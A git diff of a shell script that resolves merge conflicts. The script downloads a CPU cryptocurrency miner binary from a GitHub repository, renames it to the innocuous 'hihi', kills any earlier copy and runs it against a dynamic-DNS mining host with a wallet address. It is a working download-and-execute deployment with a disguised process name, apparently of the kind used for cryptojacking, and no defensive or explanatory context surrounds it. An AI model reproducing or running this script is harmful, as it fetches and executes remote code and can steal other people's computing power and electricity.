@@ -16,22 +16,17 @@ then
 pkill hihi
 echo " kill process"
 chmod +x hihi
-<<<<<<< HEAD
-./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az
-=======
-./hihi -F http://kaquashaki.ddns.net:5678/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
->>>>>>> 06a482fe50774052f976109ab75775ed38bf058f
+
+./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
+
 
 
 else
 
 echo "Miner da install , chay thoi "
 chmod +x hihi
-<<<<<<< HEAD
-./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az
-=======
-./hihi -F http://kaquashaki.ddns.net:5678/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
->>>>>>> 06a482fe50774052f976109ab75775ed38bf058f
+./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
+
 
 fi
 exit
@@ -40,9 +35,7 @@ fi
 wget https://github.com/StupidmanTan/miner-cpu/raw/master/aqua
 mv aqua hihi
 chmod +x hihi
-<<<<<<< HEAD
-./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az
-=======
-./hihi -F http://kaquashaki.ddns.net:5678/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
->>>>>>> 06a482fe50774052f976109ab75775ed38bf058f
+
+./hihi -F http://kaquashaki.ddns.net:56788/0x6f392f86702e358b16074ad635f9b273b44972c1/az1
+
 exit 0
